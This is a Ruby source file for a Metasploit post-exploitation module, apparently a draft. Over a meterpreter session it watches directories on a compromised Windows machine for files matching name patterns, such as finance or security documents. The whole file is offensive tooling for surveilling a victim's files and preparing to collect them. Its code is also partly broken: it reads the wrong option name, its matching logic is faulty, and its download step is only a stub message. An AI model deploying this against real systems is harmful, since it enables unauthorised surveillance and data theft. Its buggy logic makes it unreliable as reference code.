### $Id: file_stalker.rb 12468 2011-04-29 16:10:29Z hdm $
##

# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
#require 'msf/core/post/file'
require 'rex/post/file'
require 'rex'

class Metasploit3 < Msf::Post

#	include Msf::Post::File

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Stalk a directory for particular files',
			'Description'    => %q{ This module will monitor for and collect files from specified directories },
			'License'        => MSF_LICENSE,
			'Author'         => 
				[
					'kernelsmith',
					'hdm',	# Based on hdm's ios backup module which is
					'bannedit' # Based on bannedit's pidgin_cred module structure 
				],
			'Version'        => '$Revision: 1 $',
			'Platform'       => ['windows'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options(
			[
				OptString.new('DIRS', [true, 'Directories to stalk', '']),
				OptInt.new('DEPTH', [true, 'Depth at which to recurse (-1 is infinite, 0 is none)', 0]),
				OptString.new('REGEX', [false, 'Collect files that match this regex (ORd with any globbing)','']),
				OptString.new('GLOBS', [false, 'Collect files that match these globs, comma separated (ORd with any REGEX)','']),
				OptInt.new('DURATION', [true, 'How long, in seconds, to keep stalking (-1 is infinite, 0 is run once)', -1]),
				OptBool.new('EXAMPLES', [false, 'Do not run the module, just show me some example usage',false]),
				OptBool.new('DEBUG', [false, 'Verbose output for debugging',true])
			], self.class)
	end

	#
	# Windows is officially supported, other OSs/filesystems are in progress
	# 
	#
	def run
	
		if datastore['EXAMPLES'] == true
			print_status("run -j -o DIRS='C:\\Documents and Settings,C:\\docs',REGEX='sec|fin',DEPTH=2,DURATION=-1")
			print_status("- OR -")
			print_status("set DIRS 'C:\\Documents and Settings,C:\\docs'")
			print_status("set DEPTH 2")
			print_status("set GLOBS '*.doc',''")
			print_status("set DURATION -1")
			print_status("run -j")
			print_status('Run forever as a job, monitor C:\Documents and Settings\ and C:\docs\, ' +
							'recursing two levels down, for any newly created files that match sec or fin ' +
							'(ignores files present when the script starts, only gets new ones)')
			print_line()
			print_status("run -o DIRS='D:\\personal',GLOBS='*.doc,*.txt',DURATION=0")
			print_status('Run once, get all files matching *.doc or *.txt in D:\personal\, do not recurse')
			return
		end
		# validate options
		# raise option error if REGEX and GLOBS are empty
		if ( datastore['REGEX'].empty? && datastore['GLOBS'].empty? )
			raise(ArgumentError, "REGEX and GLOBS can't both be empty")
		end
		
		paths_arr= datastore['DIRS'].split(',')
		stalk(paths_arr) unless paths_arr.empty?
	end  #end of run
	
	def session_file_join(*a)
		fsep = '|'
		case session.platform
		when /win/
			fsep = '\\'
		else
			fsep = '/'
		end
		a.join(fsep)
	end
	
	def bug(*a)
		return if not datastore['DEBUG']
		string = ''
		a.each do |thing| 
			string << thing.to_s
		end
		print_status("DEBUG:  #{string}")
	end
		
	def stalk(paths)
		# TODO: confirm atleast one valid directory?  If not, error
		@paths = paths
		bug("Paths are: #{paths}")
		# remove any path from @paths that's not valid, warn about it?
		
		glob_arr = datastore['GLOBS'].split(',')
		combo = datastore['REGEXP'] || ''
		glob_arr.each do |glob|
			if combo.empty?
				combo = ".#{glob}$" 
			else
				combo = "#{combo}|.#{glob}$"
			end
		end
		bug("combo is #{combo}")
		
		pattern = Regexp.new(combo)
		
		#get initial file listing and match against pattern
		initial = []
		@paths.each do |dir|
			files = session.fs.dir.entries(dir)
			bug("Dir entries are:  #{files}")
				files.each do |f|
					next if f =~ /^(\.|\.\.)$/ # ignore entries like . and ..
					initial << session_file_join(dir,f) if pattern.match(f)
				end
		end
		
		print_status("Initially found: #{initial}")
		#results = @client.fs.file.search(location,s,recurse)
		
		delta = []
		#periodically get file listing and match against pattern
		if datastore['DURATION'] != 0
			start = Time.new()
			print_status("Stalking files, start time:  #{start}")
			# while time elapsed is < duration OR duration is set to -1 (infinite)
			while ( (Time.new - start) < datastore['DURATION'] || datastore['DURATION'] == -1 ) do
				@paths.each do |dir|
					files = session.fs.dir.entries(dir)
						files.each do |f|
							next if f =~ /^(\.|\.\.)$/ # ignore entries like . and ..
							delta << session_file_join(dir,f) if ( 
								pattern.match(f) and initial.include?("#{f}") == false and delta.include?("#{f}") == false
															)
						end
				end
			end
			print_status("Elapsed time = #{Time.new - start}")
			print_status("During that time I also found: #{delta}")
			print_status("I would download those now")
		end

	end
end
